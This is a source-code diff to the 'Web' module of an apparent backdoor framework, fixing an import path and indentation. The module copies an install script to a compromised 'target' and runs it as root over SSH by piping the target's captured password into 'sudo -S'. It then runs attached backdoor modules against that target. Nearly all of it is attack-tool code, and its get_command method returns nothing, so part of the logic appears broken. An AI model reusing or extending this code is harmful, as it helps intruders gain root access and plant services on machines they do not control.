@@ -1,4 +1,5 @@
-from backdoor import *
+from backdoors.backdoor import *
+
 
 class Web(Backdoor):
     prompt = Fore.RED + "(web) " + Fore.BLUE + ">> " + Fore.RESET
@@ -15,14 +16,15 @@ class Web(Backdoor):
         self.help_text = INFO + "Installs and starts an apache web server on the client."
 
     def get_command(self):
-	target.ssh.exec_command("echo " + target.pword + " | sudo -S bash ~/install.sh")
+        target = self.core.curtarget
+        target.ssh.exec_command("echo " + target.pword + " | sudo -S bash ~/install.sh")
     
     def do_exploit(self, args):
         target = self.core.curtarget
         print("Creating web server....")
         target.scpFiles(self, "backdoors/auxiliary/web/install.sh", False)
         target.ssh.exec_command("echo " + target.pword + " | sudo -S bash ~/install.sh")
-	for mod in self.modules.keys():
-            print(INFO + "Attempting to execute " + mod.name + " module...")
-            mod.exploit(self.get_command())
+        for mod in self.modules.keys():
+                print(INFO + "Attempting to execute " + mod.name + " module...")
+                mod.exploit(self.get_command())
 
